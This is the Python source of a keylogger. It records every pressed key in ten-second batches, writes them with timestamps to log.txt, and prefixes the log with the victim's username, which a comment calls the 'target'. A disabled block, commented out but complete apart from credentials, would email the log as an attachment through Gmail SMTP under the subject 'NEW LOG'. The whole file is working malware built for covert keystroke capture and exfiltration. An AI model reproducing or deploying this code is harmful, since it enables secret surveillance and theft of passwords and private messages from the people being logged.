import keyboard
import time
from os import path
import getpass
"""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
"""
#--------------------------EMAIL SENDING--------------------------
"""
#----INITIALIZING
email_user = ''
email_password = ''
email_send = ''

subject = 'NEW LOG'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Take a look at this :)'

#----ATTACHMEMENT SETTINGS
msg.attach(MIMEText(body,'plain'))
filename='log.txt'

if path.isfile(filename)==False: #TO BE SUR THAT THE FILE EXIST
	file_creation = open(filename, 'x')
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()

#----SENDING THE BUILDING MAIL
server = smtplib.SMTP('smtp.gmail.com',587)

server.starttls()

server.login(email_user,email_password)

server.sendmail(email_user,email_send,text)

server.quit()
"""
#--------------------------MAIN PROGRAM--------------------------

#----LOG INITIALIZING
if path.isfile('log.txt')==False: #TO BE SUR THAT THE FILE EXIST
	file_creation = open('log.txt', 'x')
log=open("log.txt", "a")
log.write(f"{getpass.getuser()}\n") #PRINTING THE NAME OF THE TARGET AT THE BEGINING OF LOG FILE
log.close()

#----MAIN LOOP
while 1:
	keyboard.start_recording()
	time.sleep(10)
	key_list = keyboard.stop_recording()
	cleared_list=""
	#READING THE LIST OF KEYS
	for i in key_list:
		if i.event_type=="down": #READING ONLY THE PRESSED KEYS
				if i.name =="space": 
					cleared_list += " " #FOR PRINTING SPACES CORRECTLY (MORE READABLE)
				else:
					cleared_list += str(i.name) #FOR ADD THE READABLE KEY IN THE LIST
	if len(key_list)!=0:
		temps=time.gmtime()
		temps=f'{temps[2]}/{temps[1]}/{temps[0]} - {temps[3]+1}:{temps[4]}:{temps[5]} : ' #PRINTING THE DATE AND TIME CLEARLY 
		log = open("log.txt", "a")
		log.write(temps + " " + str(cleared_list)+"\n") #FOR ADD THE READABLE KEY IN THE LOG FILE
		log.close()
